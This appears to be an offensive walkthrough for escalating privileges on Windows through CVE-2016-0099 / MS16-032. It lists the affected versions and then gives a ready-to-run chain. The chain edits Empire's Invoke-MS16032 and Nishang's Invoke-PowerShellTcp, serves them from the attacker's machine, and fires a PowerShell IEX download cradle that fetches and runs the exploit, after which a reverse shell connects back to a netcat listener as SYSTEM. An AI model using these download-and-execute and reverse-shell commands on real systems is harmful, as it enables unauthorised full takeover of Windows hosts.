| CVE / MS  | Title | Vulns |
| --------- | ----- | ----- |
| CVE-2016-0099 / MS16-032 | Secondary Logon Handle Privilege Escalation | win_server_2008 sp_2 arc_x64,win_server_2008 sp_1 arc_x64,win_10 arc_x64,win_vista sp_2 arc_x86,win_10 version_1511 arc_x86,win_server_2012 arc_x86,win_7 sp_1 arc_x64,win_10 version_1511 arc_x64,win_server_2008 sp_2 arc_x86,win_10 arc_x86,win_8.1 arc_x86,win_vista sp_2 arc_x64,win_8.1 arc_x64,win_7 sp_1 arc_x86,win_server_2008 sp_1 arc_x86 |

<br><br>


First get a Powershell reverse shell on target system. 
Then download this : [Invoke-MS16032.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) file in your local system, edit the file and add this below line at the bottom of the script :

```sh
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<Your-Machine-IP>:8000/Invoke-PowerShellTcp.ps1')"
```

Save it and download this : [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) file in local system, edit the file and add this below line at the bottom of the script :

```sh
Invoke-PowerShellTcp -Reverse -IPAddress <Your-Machine-IP> -Port 9000
```

Save it. make sure both files are in the same directory and start a python SimpleHTTPServer on port 8000.
Open another terminal and start a netcat listener on port 9000, we will receive System shell here later.
Then inside our Powershell reverse shell execute the following : 

```sh
IEX (New-Object Net.WebClient).DownloadString('http://<Your-Machine-IP>:8000/Invoke-MS16032.ps1')
```
wait a few seconds and a System shell will be sent to your netcat listener! 
The exploit chain oversimplified :

* requests your python server 
* downloads Invoke-MS16032.ps1
* exploitation and get system process 
* requests your python server 
* downloads Invoke-PowerShellTcp.ps1 from system process 
* invokes reverse tcp shell and connect to your netcat listener as system. 